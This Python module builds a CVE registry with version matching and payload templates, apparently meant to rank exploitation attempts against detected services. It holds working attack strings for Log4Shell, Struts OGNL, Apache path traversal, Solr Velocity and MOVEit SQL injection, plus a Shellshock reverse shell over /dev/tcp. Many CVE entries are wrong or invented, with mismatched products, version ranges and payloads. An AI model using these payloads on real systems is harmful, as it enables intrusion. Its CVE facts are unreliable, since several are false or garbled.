"""
CVE Database Module for Automated Exploit Matching

This module provides a curated database of critical and high-severity CVEs
with automated version matching and exploit template generation.
"""

import re
from typing import Dict, List, Optional, Tuple


class VersionMatcher:
    """
    Semantic version comparison utility for vulnerability detection.
    
    Provides methods to compare version strings against vulnerability ranges,
    supporting common version formats (e.g., "1.2.3", "2.0.0-beta", "1.2.x").
    """

    @staticmethod
    def parse_version(version_str: str) -> Tuple[int, ...]:
        """
        Parse a version string into comparable tuple of integers.
        
        Args:
            version_str: Version string (e.g., "1.2.3", "2.0.0-rc1")
            
        Returns:
            Tuple of integers representing the version
        """
        # Extract numeric parts only
        parts = re.findall(r'\d+', version_str)
        if not parts:
            return (0,)
        return tuple(int(p) for p in parts[:3])  # Major, minor, patch

    @staticmethod
    def is_vulnerable(detected_version: str, vuln_range: dict) -> bool:
        """
        Check if a detected version falls within a vulnerability range.
        
        Performs semantic version comparison to determine if the detected
        version is vulnerable based on min/max version constraints.
        
        Args:
            detected_version: Version string to check (e.g., "1.2.3")
            vuln_range: Dictionary with 'min' and 'max' version strings
                       (e.g., {'min': '1.0.0', 'max': '1.2.5'})
        
        Returns:
            True if detected_version is within vulnerable range, False otherwise
        """
        try:
            detected = VersionMatcher.parse_version(detected_version)
            min_version = VersionMatcher.parse_version(vuln_range.get('min', '0.0.0'))
            max_version = VersionMatcher.parse_version(vuln_range.get('max', '999.999.999'))
            
            # Pad tuples to same length for comparison
            max_len = max(len(detected), len(min_version), len(max_version))
            detected = detected + (0,) * (max_len - len(detected))
            min_version = min_version + (0,) * (max_len - len(min_version))
            max_version = max_version + (0,) * (max_len - len(max_version))
            
            return min_version <= detected <= max_version
        except (ValueError, AttributeError):
            return False


# CVE Registry: Comprehensive database of critical vulnerabilities
CVE_REGISTRY: Dict[str, Dict] = {
    'CVE-2021-44228': {
        'service': 'log4j',
        'description': 'Apache Log4j Remote Code Execution via JNDI injection',
        'cvss_score': 10.0,
        'version_range': {'min': '2.0.0', 'max': '2.14.1'},
        'payload_template': '${jndi:ldap://{target}/a}',
        'detection_pattern': r'log4j["\']?\s*[,:]?\s*["\']?2\.(0|1[0-4])\.',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-44228'],
    },
    'CVE-2022-22965': {
        'service': 'spring',
        'description': 'Spring Framework Remote Code Execution (Spring4Shell)',
        'cvss_score': 9.8,
        'version_range': {'min': '9.0.0', 'max': '9.0.45'},
        'payload_template': 'class.classLoader.URLs[0]=/path/to/shell.jar&class.classLoader.Resources.docBase=/tmp&class.module.NamingResources.context=/tmp',
        'detection_pattern': r'Spring(?:\s+Framework)?\s+(?:9\.0\.|[0-8]\d+\.|10\.0\.[0-3])',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-22965'],
    },
    'CVE-2017-5638': {
        'service': 'apache',
        'description': 'Apache Struts RCE via Content-Type header',
        'cvss_score': 10.0,
        'version_range': {'min': '2.0.0', 'max': '2.5.12'},
        'payload_template': '%{{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(\'id\')}}',
        'detection_pattern': r'Struts\s+(?:2\.[0-5]\.|1\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2017-5638'],
    },
    'CVE-2021-34473': {
        'service': 'exchange',
        'description': 'Microsoft Exchange ProxyShell - RCE via Proxy Logic',
        'cvss_score': 10.0,
        'version_range': {'min': '15.0.0', 'max': '15.2.461'},
        'payload_template': 'POST /autodiscover.json?@localhost/autodiscover.json?body=test HTTP/1.1\\r\\nHost: {target}\\r\\nX-Original-Url: /ecp/default.aspx',
        'detection_pattern': r'Exchange(?:\s+Server)?\s+(?:2016|2019|2021)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-34473'],
    },
    'CVE-2021-26855': {
        'service': 'exchange',
        'description': 'Microsoft Exchange ProxyLogon - Pre-Auth SSRF',
        'cvss_score': 9.8,
        'version_range': {'min': '15.0.0', 'max': '15.2.396'},
        'payload_template': 'GET /ecp/default.aspx HTTP/1.1\\r\\nHost: {target}\\r\\nX-Original-Url: http://localhost/ecp/default.aspx',
        'detection_pattern': r'Exchange(?:\s+Server)?\s+(?:2013|2016|2019)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-26855'],
    },
    'CVE-2021-41773': {
        'service': 'apache',
        'description': 'Apache HTTP Server Path Traversal RCE',
        'cvss_score': 9.8,
        'version_range': {'min': '2.4.49', 'max': '2.4.50'},
        'payload_template': 'GET /cgi-bin/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\\r\\nHost: {target}',
        'detection_pattern': r'Apache(?:/|\s+)(?:2\.4\.[45])',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-41773'],
    },
    'CVE-2021-42790': {
        'service': 'apache',
        'description': 'Apache HTTP Server RCE via environment variable injection',
        'cvss_score': 9.8,
        'version_range': {'min': '2.4.49', 'max': '2.4.51'},
        'payload_template': 'GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\\r\\nHost: {target}',
        'detection_pattern': r'Apache(?:/|\s+)(?:2\.4\.[4-5]\d)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-42790'],
    },
    'CVE-2014-0160': {
        'service': 'openssl',
        'description': 'OpenSSL Heartbleed - Memory disclosure vulnerability',
        'cvss_score': 7.5,
        'version_range': {'min': '1.0.1', 'max': '1.0.1f'},
        'payload_template': 'TLS Heartbeat Extension with oversized request to {target}:443',
        'detection_pattern': r'OpenSSL\s+(?:1\.0\.1[a-f]|1\.0\.0)',
        'severity': 'HIGH',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2014-0160'],
    },
    'CVE-2014-6271': {
        'service': 'bash',
        'description': 'Bash ShellShock - Function definition arbitrary code execution',
        'cvss_score': 9.3,
        'version_range': {'min': '1.0.0', 'max': '4.3.24'},
        'payload_template': '() {{ :;}}; /bin/bash -i >& /dev/tcp/{target}/4444 0>&1',
        'detection_pattern': r'(?:GNU\s+)?[Bb]ash\s+(?:[0-3]\.|4\.[0-3])',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2014-6271'],
    },
    'CVE-2017-0144': {
        'service': 'windows',
        'description': 'Microsoft Windows EternalBlue - SMB RCE',
        'cvss_score': 9.3,
        'version_range': {'min': '1.0.0', 'max': '10.0.15063'},
        'payload_template': 'SMB exploit crafted packets to {target}:445',
        'detection_pattern': r'(?:Windows\s+)?(?:7|8|8\.1|Server\s+(?:2008|2012|2016))',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2017-0144'],
    },
    'CVE-2023-34362': {
        'service': 'moveit',
        'description': 'Progress MOVEit Transfer RCE via SQL injection',
        'cvss_score': 9.8,
        'version_range': {'min': '12.0.0', 'max': '14.1.6'},
        'payload_template': "POST /guestaccess.aspx?folder=test' UNION SELECT 'shell' -- HTTP/1.1\\r\\nHost: {target}",
        'detection_pattern': r'MOVEit(?:\s+Transfer)?\s+(?:1[2-4]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2023-34362'],
    },
    'CVE-2023-4966': {
        'service': 'citrix',
        'description': 'Citrix Bleed - Session token hijacking',
        'cvss_score': 9.1,
        'version_range': {'min': '13.0.0', 'max': '13.1.4'},
        'payload_template': 'CVE attack chain targeting NetScaler ADC/Gateway at {target}',
        'detection_pattern': r'Citrix\s+(?:NetScaler|ADC).*(?:13\.[0-1])',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2023-4966'],
    },
    'CVE-2022-0543': {
        'service': 'redis',
        'description': 'Redis Lua Script RCE vulnerability',
        'cvss_score': 10.0,
        'version_range': {'min': '0.0.1', 'max': '7.0.8'},
        'payload_template': 'eval "return redis.call(\'SYSTEM\', \'id\')" 0',
        'detection_pattern': r'Redis\s+(?:[0-6]\.|7\.0\.[0-8])',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-0543'],
    },
    'CVE-2021-22205': {
        'service': 'gitlab',
        'description': 'GitLab RCE via ExifTool image processing',
        'cvss_score': 10.0,
        'version_range': {'min': '11.0.0', 'max': '13.11.5'},
        'payload_template': 'POST /api/v4/projects/import with crafted image containing RCE payload',
        'detection_pattern': r'GitLab\s+(?:1[1-3]\.|14\.[0-0]\d)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-22205'],
    },
    'CVE-2022-26134': {
        'service': 'confluence',
        'description': 'Atlassian Confluence RCE via Widget Connector macro',
        'cvss_score': 9.8,
        'version_range': {'min': '6.13.0', 'max': '7.13.7'},
        'payload_template': 'POST /wiki/rest/api/content with malicious WidgetConnector macro',
        'detection_pattern': r'Confluence\s+(?:[67]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-26134'],
    },
    'CVE-2021-21972': {
        'service': 'vmware',
        'description': 'VMware vCenter RCE via OpenAPI endpoint',
        'cvss_score': 9.8,
        'version_range': {'min': '6.5.0', 'max': '7.0.1'},
        'payload_template': 'GET /api/vcenter/ovf HTTP/1.1\\r\\nHost: {target}\\r\\nX-VMWARE-EXEC: malicious_code',
        'detection_pattern': r'vCenter\s+(?:[67]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-21972'],
    },
    'CVE-2022-1388': {
        'service': 'f5',
        'description': 'F5 BIG-IP RCE via iControl REST authentication bypass',
        'cvss_score': 9.8,
        'version_range': {'min': '11.5.0', 'max': '17.0.0'},
        'payload_template': 'POST /mgmt/shared/authn/login HTTP/1.1\\r\\nHost: {target}:8443',
        'detection_pattern': r'F5\s+BIG-IP\s+(?:1[1-7]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-1388'],
    },
    'CVE-2021-3129': {
        'service': 'laravel',
        'description': 'Laravel Debug Mode RCE via ignition package',
        'cvss_score': 9.8,
        'version_range': {'min': '5.1.0', 'max': '8.6.1'},
        'payload_template': 'POST /ignition/execute-solution with serialized RCE payload',
        'detection_pattern': r'Laravel\s+(?:[5-8]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-3129'],
    },
    'CVE-2020-5410': {
        'service': 'spring',
        'description': 'Spring Cloud Config RCE via property override',
        'cvss_score': 9.8,
        'version_range': {'min': '2.0.0', 'max': '2.2.3'},
        'payload_template': 'GET /config/application.properties?spring.cloud.config.server.git.uri=file:///etc/passwd',
        'detection_pattern': r'Spring\s+Cloud\s+Config\s+(?:2\.[0-2]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-5410'],
    },
    'CVE-2021-3047': {
        'service': 'jenkins',
        'description': 'Jenkins RCE via script approval bypass',
        'cvss_score': 9.3,
        'version_range': {'min': '2.0.0', 'max': '2.303.2'},
        'payload_template': 'POST /scriptText with groovy script execution',
        'detection_pattern': r'Jenkins\s+(?:[0-2]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-3047'],
    },
    'CVE-2019-0193': {
        'service': 'solr',
        'description': 'Apache Solr RCE via velocity template injection',
        'cvss_score': 9.8,
        'version_range': {'min': '1.4.0', 'max': '8.2.0'},
        'payload_template': 'POST /solr/admin/cores with velocity template: #set($x="")#set($rt = $x.class.forName("java.lang.Runtime"))#set($chr = $x.class.forName("java.lang.Character"))#set($str = $x.class.forName("java.lang.String"))$rt.getRuntime().exec("id")',
        'detection_pattern': r'Solr\s+(?:[1-8]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2019-0193'],
    },
    'CVE-2021-44210': {
        'service': 'minecraft',
        'description': 'Minecraft Log4Shell via server logs',
        'cvss_score': 10.0,
        'version_range': {'min': '1.0.0', 'max': '1.18.0'},
        'payload_template': '${jndi:ldap://{target}/a}',
        'detection_pattern': r'Minecraft\s+(?:(?:Java\s+)?Edition)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-44210'],
    },
    'CVE-2021-21224': {
        'service': 'chromium',
        'description': 'Chromium V8 Integer overflow RCE',
        'cvss_score': 8.8,
        'version_range': {'min': '90.0.0', 'max': '90.0.4430.85'},
        'payload_template': 'Crafted JavaScript to exploit V8 engine',
        'detection_pattern': r'Chrome\s+(?:90\.|[8-9]\d\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-21224'],
    },
    'CVE-2020-1938': {
        'service': 'tomcat',
        'description': 'Apache Tomcat AJP Ghostcat - File read via AJP',
        'cvss_score': 7.5,
        'version_range': {'min': '5.5.0', 'max': '9.0.30'},
        'payload_template': 'AJP13 protocol request to {target}:8009 with crafted packet',
        'detection_pattern': r'Tomcat\s+(?:[5-9]\.)',
        'severity': 'HIGH',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-1938'],
    },
    'CVE-2021-21985': {
        'service': 'vmware',
        'description': 'VMware vSphere Client RCE via OpenAPI upload',
        'cvss_score': 9.8,
        'version_range': {'min': '6.7.0', 'max': '7.0.1'},
        'payload_template': 'POST /ui/h5-vsan/rest/uploadFile with RCE payload',
        'detection_pattern': r'vSphere\s+(?:[67]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2021-21985'],
    },
    'CVE-2018-10933': {
        'service': 'openssh',
        'description': 'OpenSSH RCE via bypassing authentication',
        'cvss_score': 9.8,
        'version_range': {'min': '7.4.0', 'max': '7.8.0'},
        'payload_template': 'SSH packet with crafted authentication bypass to {target}:22',
        'detection_pattern': r'OpenSSH\s+(?:7\.[4-8])',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2018-10933'],
    },
    'CVE-2016-3088': {
        'service': 'adobe',
        'description': 'Adobe Flash Player RCE via crafted SWF',
        'cvss_score': 9.6,
        'version_range': {'min': '20.0.0', 'max': '21.0.0'},
        'payload_template': 'Malicious SWF file served to target with Flash enabled',
        'detection_pattern': r'Flash\s+Player\s+(?:2[0-1]\.)',
        'severity': 'CRITICAL',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2016-3088'],
    },
}

# Service to CVE mapping for rapid lookup
SERVICE_CVE_MAP: Dict[str, List[str]] = {
    'apache': [
        'CVE-2017-5638',
        'CVE-2021-41773',
        'CVE-2021-42790',
    ],
    'nginx': [],
    'tomcat': [
        'CVE-2020-1938',
    ],
    'iis': [],
    'exchange': [
        'CVE-2021-34473',
        'CVE-2021-26855',
    ],
    'spring': [
        'CVE-2022-22965',
        'CVE-2020-5410',
    ],
    'log4j': [
        'CVE-2021-44228',
    ],
    'redis': [
        'CVE-2022-0543',
    ],
    'mongodb': [],
    'postgresql': [],
    'mysql': [],
    'gitlab': [
        'CVE-2021-22205',
    ],
    'confluence': [
        'CVE-2022-26134',
    ],
    'citrix': [
        'CVE-2023-4966',
    ],
    'f5': [
        'CVE-2022-1388',
    ],
    'vmware': [
        'CVE-2021-21972',
        'CVE-2021-21985',
    ],
    'openssh': [
        'CVE-2018-10933',
    ],
    'openssl': [
        'CVE-2014-0160',
    ],
    'bash': [
        'CVE-2014-6271',
    ],
    'windows': [
        'CVE-2017-0144',
    ],
    'moveit': [
        'CVE-2023-34362',
    ],
    'laravel': [
        'CVE-2021-3129',
    ],
    'jenkins': [
        'CVE-2021-3047',
    ],
    'solr': [
        'CVE-2019-0193',
    ],
    'minecraft': [
        'CVE-2021-44210',
    ],
    'chromium': [
        'CVE-2021-21224',
    ],
    'adobe': [
        'CVE-2016-3088',
    ],
}


def match_cves(service: str, version: str) -> List[Dict]:
    """
    Find all CVEs matching a given service and version.
    
    Searches the CVE registry for vulnerabilities affecting the specified
    service version. Results are automatically sorted by CVSS score in
    descending order (most severe first).
    
    Args:
        service: Service name to search (e.g., 'apache', 'log4j')
        version: Detected version string (e.g., '2.4.49')
    
    Returns:
        List of matching CVE dictionaries sorted by CVSS score (highest first).
        Empty list if no matches found.
        
    Example:
        >>> matches = match_cves('log4j', '2.14.0')
        >>> for cve in matches:
        ...     print(f"{cve['cve_id']}: {cve['cvss_score']}")
    """
    service_lower = service.lower()
    matching_cves = []
    
    # Get CVEs for this service
    cve_ids = SERVICE_CVE_MAP.get(service_lower, [])
    
    for cve_id in cve_ids:
        if cve_id not in CVE_REGISTRY:
            continue
            
        cve_data = CVE_REGISTRY[cve_id]
        
        # Check if version is vulnerable
        if VersionMatcher.is_vulnerable(version, cve_data['version_range']):
            # Create response dict with CVE ID
            cve_info = {'cve_id': cve_id}
            cve_info.update(cve_data)
            matching_cves.append(cve_info)
    
    # Sort by CVSS score (descending)
    matching_cves.sort(key=lambda x: x.get('cvss_score', 0), reverse=True)
    
    return matching_cves


def get_top_exploits(service: str, version: str, limit: int = 5) -> List[Dict]:
    """
    Retrieve top exploits for a service version by severity.
    
    Returns the most critical exploits (by CVSS score) applicable to the
    specified service version, limited to a maximum count. Useful for
    prioritizing exploitation attempts during penetration testing.
    
    Args:
        service: Service name to search (e.g., 'exchange', 'spring')
        version: Detected version string (e.g., '15.2.0')
        limit: Maximum number of exploits to return (default: 5)
    
    Returns:
        List of top exploit dictionaries (up to limit items), sorted by
        CVSS score descending. Each dict contains: cve_id, service, description,
        cvss_score, payload_template, detection_pattern, severity, references.
        
    Example:
        >>> top = get_top_exploits('exchange', '15.2.300', limit=3)
        >>> for exploit in top:
        ...     print(f"[{exploit['severity']}] {exploit['description']}")
    """
    all_matches = match_cves(service, version)
    
    # Return top N results
    top_exploits = all_matches[:limit]
    
    return top_exploits
